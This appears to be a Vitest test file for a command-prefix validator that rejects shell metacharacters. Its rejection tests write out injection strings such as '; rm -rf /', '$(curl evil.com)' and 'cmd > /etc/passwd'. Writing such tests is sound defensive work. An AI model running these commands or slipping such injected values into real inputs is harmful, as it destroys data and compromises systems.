import { describe, it, expect } from 'vitest';
import { validateCommandPrefix } from './command-prefix-validation';

describe('validateCommandPrefix', () => {
  it('allows simple binary paths', () => {
    expect(validateCommandPrefix('nix-shell -c')).toBe('nix-shell -c');
    expect(validateCommandPrefix('/usr/bin/env')).toBe('/usr/bin/env');
    expect(validateCommandPrefix('conda activate myenv')).toBe('conda activate myenv');
  });

  it('allows paths with dots and hyphens', () => {
    expect(validateCommandPrefix('. ./init.sh')).toBe('. ./init.sh');
    expect(validateCommandPrefix('source /opt/my-env/bin/activate')).toBe('source /opt/my-env/bin/activate');
  });

  it('rejects semicolons', () => {
    expect(() => validateCommandPrefix('; rm -rf /')).toThrow('disallowed shell metacharacters');
  });

  it('rejects pipe characters', () => {
    expect(() => validateCommandPrefix('echo x | curl')).toThrow('disallowed shell metacharacters');
  });

  it('rejects ampersands', () => {
    expect(() => validateCommandPrefix('cmd && evil')).toThrow('disallowed shell metacharacters');
    expect(() => validateCommandPrefix('cmd & bg')).toThrow('disallowed shell metacharacters');
  });

  it('rejects dollar signs and subshells', () => {
    expect(() => validateCommandPrefix('$(curl evil.com)')).toThrow('disallowed shell metacharacters');
    expect(() => validateCommandPrefix('$HOME/bin')).toThrow('disallowed shell metacharacters');
  });

  it('rejects backticks', () => {
    expect(() => validateCommandPrefix('`whoami`')).toThrow('disallowed shell metacharacters');
  });

  it('rejects parentheses', () => {
    expect(() => validateCommandPrefix('(subshell)')).toThrow('disallowed shell metacharacters');
  });

  it('rejects redirects', () => {
    expect(() => validateCommandPrefix('cmd > /etc/passwd')).toThrow('disallowed shell metacharacters');
    expect(() => validateCommandPrefix('cmd < /dev/null')).toThrow('disallowed shell metacharacters');
  });

  it('rejects exclamation marks', () => {
    expect(() => validateCommandPrefix('!history')).toThrow('disallowed shell metacharacters');
  });
});
